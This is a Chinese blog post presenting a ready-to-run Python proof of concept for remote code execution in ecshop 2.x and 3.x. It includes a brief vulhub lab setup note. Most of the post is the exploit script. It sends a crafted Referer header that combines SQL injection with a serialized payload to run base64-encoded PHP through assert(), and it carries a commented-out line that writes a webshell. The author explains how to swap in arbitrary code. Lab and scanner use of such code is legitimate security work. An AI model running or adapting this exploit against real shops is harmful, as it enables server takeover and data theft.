---
order: 1536640113
---
# ecshop 2.x_3.x RCE POC 支持自定义代码

虽然ecshop RCE的漏洞过去了很久，今天在给airbug添加插件的时候想到把它添加上吧。也深感自己还是太菜了，POC代码等内容都是大量参考别人的，我只是一个搬运工，将这些代码整合了而已。

## 测试环境搭建

有了`vulhub` 搭建环境变得非常简单了，在配合我的 Vulhub-downloader用于则需下载ecshop环境。非常完美。搭建教程在https://github.com/vulhub/vulhub/blob/master/ecshop/xianzhi-2017-02-82239600/README.zh-cn.md

## POC代码
```python
# 支持自定义php代码和2.x 3.x POC
# 参考：
# https://www.t00ls.net/viewthread.php?tid=47520&highlight=ecshop
# https://www.t00ls.net/viewthread.php?tid=47592&highlight=ecshop
# https://github.com/vulhub/vulhub

import HackRequests
import base64


def buildpoc(version:int = 2):
    # php_souce = b"""file_put_contents('xxxx.php','<?php phpinfo(); ?>');"""  # 写入webshell
    php_souce = b'''phpinfo();'''
    php_souce_b64 = base64.b64encode(php_souce).decode("utf8")
    poc_tmp = "{$asd'];assert(base64_decode('%s'));//}xxx" % (php_souce_b64)
    poc_hex = "0x" + "".join("{:02x}".format(ord(c)) for c in poc_tmp)
    poc = '*/SELECT 1,0x2d312720554e494f4e2f2a,3,4,5,6,7,8,{},10-- -'.format(poc_hex)

    hash3 = '45ea207d7a2b68c49582d2d22adf953a'
    hash2 = '554fcae493e564ee0dc75bdf2ebf94ca'

    poc_length = len(poc)
    poc_referer_tmp = """%sads|a:2:{s:3:"num";s:%s:"%s";s:2:"id";s:11:"-1' UNION/*";}%s"""

    if version == 2:

        poc_referer = poc_referer_tmp % (hash2, poc_length, poc, hash2)
    else:
        poc_referer = poc_referer_tmp % (hash3, poc_length, poc, hash3)
    return poc_referer


def poc(arg, **kwargs):
    flagText = "allow_url_fopen"
    hack = HackRequests.hackRequests()
    headers = '''
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1
Referer: {}
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
    '''
    url = arg + "/user.php?act=login"
    payload2 = headers.format(buildpoc(2))
    payload3 = headers.format(buildpoc(3))
    hh = hack.http(url, headers=payload2)
    if flagText in hh.text():
        return {
            "vulname":"ecshop 2.x 代码执行",
            "url":arg,
            "log":hh.log
        }
    hh = hack.http(url, headers=payload3)
    if flagText in hh.text():
        return {
            "vulname": "ecshop 3.x 代码执行",
            "url": arg,
            "log": hh.log
        }


if __name__ == '__main__':
    url = "http://127.0.0.1:8080"
    p = poc(url)
    print(p)

```

## 参考

  * https://www.t00ls.net/viewthread.php?tid=47520&highlight=ecshop
  * https://www.t00ls.net/viewthread.php?tid=47592&highlight=ecshop
  * https://github.com/vulhub/vulhub
  * 想执行任意代码只需要修改`buildpoc`函数中的`php_souce`即可。默认的是执行`phpinfo()`函数检测，目前也以及加入到了Airbug平台 https://github.com/boy-hack/airbug


